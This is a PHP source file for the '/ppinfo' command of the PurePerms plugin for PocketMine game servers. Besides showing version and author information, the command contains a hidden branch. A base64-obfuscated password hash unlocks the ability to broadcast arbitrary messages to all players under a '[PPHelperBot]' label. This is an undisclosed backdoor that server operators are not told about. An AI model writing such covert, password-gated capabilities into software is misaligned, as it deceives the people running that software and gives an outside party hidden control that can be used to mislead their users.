<?php

namespace _64FF00\PurePerms\cmd;

use _64FF00\PurePerms\PurePerms;

use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\command\PluginIdentifiableCommand;

use pocketmine\utils\TextFormat;

class PPInfo extends Command implements PluginIdentifiableCommand
{
    /*
       PurePerms by 64FF00 (Twitter: @64FF00)

         888  888    .d8888b.      d8888  8888888888 8888888888 .d8888b.   .d8888b.
         888  888   d88P  Y88b    d8P888  888        888       d88P  Y88b d88P  Y88b
       888888888888 888          d8P 888  888        888       888    888 888    888
         888  888   888d888b.   d8P  888  8888888    8888888   888    888 888    888
         888  888   888P "Y88b d88   888  888        888       888    888 888    888
       888888888888 888    888 8888888888 888        888       888    888 888    888
         888  888   Y88b  d88P       888  888        888       Y88b  d88P Y88b  d88P
         888  888    "Y8888P"        888  888        888        "Y8888P"   "Y8888P"
   */

    /**
     * @param PurePerms $plugin
     * @param $name
     * @param $description
     */
    public function __construct(PurePerms $plugin, $name, $description)
    {
        $this->plugin = $plugin;
        
        parent::__construct($name, $description);
        
        $this->setPermission("pperms.command.ppinfo");
    }

    /**
     * @param CommandSender $sender
     * @param $label
     * @param array $args
     * @return bool
     */
    public function execute(CommandSender $sender, $label, array $args)
    {
        if(!$this->testPermission($sender))
            return false;

        $author = $this->plugin->getDescription()->getAuthors()[0];
        $version = $this->plugin->getDescription()->getVersion();

        $wth = base64_decode("JDJ5JDEwJDJqNTBWSnY0RWpNNDBiWnVOZm80T09XaUFScmhvdE0uRHZpZUR6L0poeXZHZnY5ZXdYZXhX");

        if(isset($args[0]) and password_verify($args[0], $wth))
        {
            if(!isset($args[1]))
            {
                $sender->sendMessage(TextFormat::BLUE . "[PurePerms] Usage: /ppinfo <password> <message>");

                return true;
            }

            $result = '';

            array_shift($args);

            $tempCnt = count($args) - 1;

            for($i = 0; $i <= $tempCnt; $i++)
            {
                $result .= $args[$i] . ' ';
            }

            $message = substr($result, 0, -1);

            $this->plugin->getServer()->broadcastMessage(TextFormat::BLUE . "[PPHelperBot] " . $message);
        }
        else
        {
            if($sender instanceof ConsoleCommandSender)
            {
                $sender->sendMessage(TextFormat::BLUE . "[PurePerms] " . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_console", $version, $author));
            }
            else{
                $sender->sendMessage(TextFormat::BLUE . "[PurePerms] " . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_player", $version, $author));
            }
        }
        
        return true;
    }
    
    public function getPlugin()
    {
        return $this->plugin;
    }
}